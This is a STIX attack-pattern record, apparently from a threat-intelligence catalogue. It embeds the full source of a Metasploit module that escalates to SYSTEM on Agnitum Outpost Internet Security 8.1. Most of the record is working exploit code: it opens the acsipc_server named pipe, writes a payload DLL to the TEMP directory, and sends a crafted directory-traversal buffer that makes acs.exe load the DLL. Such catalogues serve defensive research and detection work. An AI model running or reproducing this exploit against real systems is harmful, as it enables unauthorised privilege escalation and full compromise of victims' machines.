{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b7609a6-e727-49ad-bf32-457cda1cf157",
    "created": "2024-08-14T16:49:10.696735Z",
    "modified": "2024-08-14T16:49:10.696739Z",
    "name": "Agnitum Outpost Internet Security Local Privilege Escalation",
    "description": " This module exploits a directory traversal vulnerability on Agnitum Outpost Internet Security 8.1. The vulnerability exists in the acs.exe component, allowing the user to load arbitrary DLLs through the acsipc_server named pipe, and finally execute arbitrary code with SYSTEM privileges. This module has been tested successfully on Windows 7 SP1 with Agnitum Outpost Internet Security 8.1 (32 bits and 64 bits versions).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/agnitum_outpost_acs.rb",
            "external_id": "agnitum_outpost_acs.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Agnitum Outpost Internet Security Local Privilege Escalation',\n          'Description' => %q{\n            This module exploits a directory traversal vulnerability on Agnitum Outpost Internet\n            Security 8.1. The vulnerability exists in the acs.exe component, allowing the user to load\n            arbitrary DLLs through the acsipc_server named pipe, and finally execute arbitrary\n            code with SYSTEM privileges. This module has been tested successfully on Windows 7 SP1 with\n            Agnitum Outpost Internet Security 8.1 (32 bits and 64 bits versions).\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Ahmad Moghimi', # Vulnerability discovery\n            'juan vazquez' # MSF module\n          ],\n          'Arch' => [ARCH_X86, ARCH_X64],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Privileged' => true,\n          'Targets' => [\n            [ 'Agnitum Outpost Internet Security 8.1', {} ],\n          ],\n          'Payload' => {\n            'Space' => 2048,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'OSVDB', '96208' ],\n            [ 'EDB', '27282' ]\n          ],\n          'DisclosureDate' => '2013-08-02',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_config_getenv\n              ]\n            }\n          }\n        }\n      )\n    )\n\n    register_options([\n      # It is OptPath becuase it's a *remote* path\n      OptString.new(\"WritableDir\", [ false, \"A directory where we can write files (%TEMP% by default)\" ]),\n      # By default acs.exe lives on C:\\Program Files\\Agnitum\\Outpost Security Suite Pro\\\n      OptInt.new(\"DEPTH\", [ true, \"Traversal depth\", 3 ])\n    ])\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"V\").first\n  end\n\n  def open_named_pipe(pipe)\n    invalid_handle_value = 0xFFFFFFFF\n\n    r = session.railgun.kernel32.CreateFileA(pipe, \"GENERIC_READ | GENERIC_WRITE\", 0x3, nil, \"OPEN_EXISTING\", \"FILE_FLAG_WRITE_THROUGH | FILE_ATTRIBUTE_NORMAL\", 0)\n\n    handle = r['return']\n\n    if handle == invalid_handle_value\n      return nil\n    end\n\n    return handle\n  end\n\n  def write_named_pipe(handle, dll_path, dll_name)\n    traversal_path = \"..\\\\\" * datastore[\"DEPTH\"]\n    traversal_path << dll_path.gsub(/^[a-zA-Z]+:\\\\/, \"\")\n    traversal_path << \"\\\\#{dll_name}\"\n\n    path = Rex::Text.to_unicode(traversal_path)\n\n    data = \"\\x00\" * 0x11\n    data << path\n    data << \"\\x00\\x00\"\n    data << \"\\x00\\x00\\x00\"\n\n    buf = [0xd48a445e, 0x466e1597, 0x327416ba, 0x68ccde15].pack(\"V*\") # GUID common_handler\n    buf << [0x17].pack(\"V\") # command\n    buf << [junk].pack(\"V\")\n    buf << [data.length].pack(\"V\")\n    buf << [0, 0, 0].pack(\"V*\")\n    buf << data\n\n    w = client.railgun.kernel32.WriteFile(handle, buf, buf.length, 4, nil)\n\n    if w['return'] == false\n      print_error(\"The was an error writing to disk, check permissions\")\n      return nil\n    end\n\n    return w['lpNumberOfBytesWritten']\n  end\n\n  def check\n    handle = open_named_pipe(\"\\\\\\\\.\\\\pipe\\\\acsipc_server\")\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n    return Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    temp_dir = \"\"\n\n    print_status(\"Opening named pipe...\")\n    handle = open_named_pipe(\"\\\\\\\\.\\\\pipe\\\\acsipc_server\")\n    if handle.nil?\n      fail_with(Failure::NoTarget, \"\\\\\\\\.\\\\pipe\\\\acsipc_server named pipe not found\")\n    else\n      print_good(\"\\\\\\\\.\\\\pipe\\\\acsipc_server found! Proceeding...\")\n    end\n\n    if datastore[\"WritableDir\"] and not datastore[\"WritableDir\"].empty?\n      temp_dir = datastore[\"WritableDir\"]\n    else\n      temp_dir = client.sys.config.getenv('TEMP')\n    end\n\n    print_status(\"Using #{temp_dir} to drop malicious DLL...\")\n    begin\n      cd(temp_dir)\n    rescue Rex::Post::Meterpreter::RequestError\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::BadConfig, \"Failed to use the #{temp_dir} directory\")\n    end\n\n    print_status(\"Writing malicious DLL to remote filesystem\")\n    write_path = pwd\n    dll_name = \"#{rand_text_alpha(10 + rand(10))}.dll\"\n    begin\n      # Agnitum Outpost Internet Security doesn't complain when dropping the dll to filesystem\n      write_file(dll_name, generate_payload_dll)\n      register_file_for_cleanup(\"#{write_path}\\\\#{dll_name}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::BadConfig, \"Failed to drop payload into #{temp_dir}\")\n    end\n\n    print_status(\"Exploiting through \\\\\\\\.\\\\pipe\\\\acsipc_server...\")\n    bytes = write_named_pipe(handle, write_path, dll_name)\n    session.railgun.kernel32.CloseHandle(handle)\n\n    if bytes.nil?\n      fail_with(Failure::Unknown, \"Failed while writing to \\\\\\\\.\\\\pipe\\\\acsipc_server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-02",
    "x_mitre_platforms": [
        "win'"
    ]
}